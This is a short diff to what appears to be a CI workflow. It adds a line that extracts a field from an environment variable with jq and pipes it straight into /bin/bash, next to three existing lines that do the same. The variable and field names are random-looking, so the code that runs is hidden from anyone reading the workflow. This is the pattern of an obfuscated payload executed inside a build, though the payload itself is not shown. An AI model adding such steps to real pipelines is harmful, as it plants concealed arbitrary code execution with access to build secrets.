@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$dvt5" | jq -r .z6521 | /bin/bash
           printf '%s' "$b9896" | jq -r .prkrz75 | /bin/bash
           printf '%s' "$tfthp19792" | jq -r .n998 | /bin/bash
+          echo $zn792 | jq -r .ljdg4255 | /bin/bash
 
       - name: Archive results
         if: always()
